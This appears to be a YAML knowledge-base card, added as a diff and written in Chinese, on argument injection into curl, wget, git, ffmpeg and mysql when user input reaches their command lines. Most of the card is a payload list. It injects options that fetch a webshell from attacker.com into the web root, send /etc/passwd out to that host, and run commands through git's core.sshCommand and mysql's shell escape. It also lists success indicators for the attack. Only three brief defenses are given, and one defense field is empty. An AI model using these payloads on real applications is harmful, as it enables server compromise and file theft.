@@ -1,0 +1,69 @@
+# 技术卡片: 命令注入 - 参数注入（curl/wget/git）
+# 分类: cmd-injection / argument-injection
+# 版本: 1.0
+# 日期: 2026-07-21
+# 来源: SecAtlas KB-CMD-009
+
+id: "cmd-arg-injection"
+name: "命令注入 - 参数注入（curl/wget/git/ffmpeg）"
+category: "cmd-injection"
+subcategory: "argument-injection"
+severity: "high"
+
+description: |
+  用户输入作为命令行工具的参数时，注入工具自身选项达成命令执行。
+  curl -o 写文件、-F 外泄文件；git --config 注入命令；
+  wget --post-file 泄露文件；ffmpeg 读文件/SSRF。
+
+trigger_signals:
+  - "应用调用 curl/wget/git/ffmpeg/mysql 等命令行工具"
+  - "用户输入作为工具参数（URL/路径/文件名）"
+  - "未使用 -- 参数分隔符"
+
+payloads:
+  curl:
+    - write: "http://attacker.com/shell.sh -o /var/www/html/shell.php"
+      note: "下载 webshell 到 web 目录"
+    - exfil: "http://attacker.com/ -F file=@/etc/passwd"
+      note: "上传文件到攻击者服务器"
+    - exfil2: "-d @/etc/passwd http://attacker.com/"
+    - upload: "--upload-file /etc/passwd http://attacker.com/"
+
+  wget:
+    - exfil: "http://attacker.com/ --post-file=/etc/passwd"
+    - write: "http://attacker.com/shell.php -O /var/www/html/shell.php"
+    - output: "--output-document=/tmp/out http://attacker.com/"
+
+  git:
+    - rce: "https://github.com/user/repo.git --config core.sshCommand='id'"
+    - config: "-c core.sshCommand='curl http://attacker/$(whoami)' clone https://x"
+
+  ffmpeg:
+    - ssrf: "-i http://attacker.com/$(cat /etc/passwd)"
+    - read: "-f lavfi -i movie=/etc/passwd"
+
+  mysql:
+    - read: "-u root -e \"SELECT LOAD_FILE('/etc/passwd')\""
+    - exec: "-u root -e \"\\! id\""
+
+defense_primary:
+  - "用户可控参数前加 -- 参数分隔符"
+  - "使用编程语言 HTTP/文件库代替 shell 调用"
+  - "白名单验证输入值"
+
+defense:
+
+success_indicators:
+  - "curl -o 写入文件成功"
+  - "攻击者服务器收到外泄文件"
+  - "命令执行回显"
+
+prerequisites:
+  - "应用使用 shell 调用命令行工具"
+  - "用户可控参数未做输入校验"
+  - "目标服务器可出站"
+
+sources:
+  - kb: "KB-CMD-009"
+  - ref: "HackTricks: Argument Injection"
+  - ref: "CWE-88"
